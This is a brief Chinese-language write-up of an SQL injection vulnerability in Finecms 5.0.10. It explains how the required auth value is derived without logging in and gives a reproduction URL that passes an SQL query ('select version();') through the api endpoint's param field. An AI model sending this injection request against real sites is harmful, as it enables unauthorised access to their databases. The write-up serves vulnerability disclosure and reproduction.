Finecms 5.0.10 sql注入漏洞
==========================

一、漏洞简介
------------

> auth值是由`zero_ci_session`中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义

二、漏洞影响
------------

Finecms 5.0.10

三、复现过程
------------

    http://0-sec.org/index.php?c=api&m=目标站点的值&param=action=sql%20sql=%27select%20version();%27

![](./.resource/Finecms5.0.10sql注入漏洞/media/rId24.png)
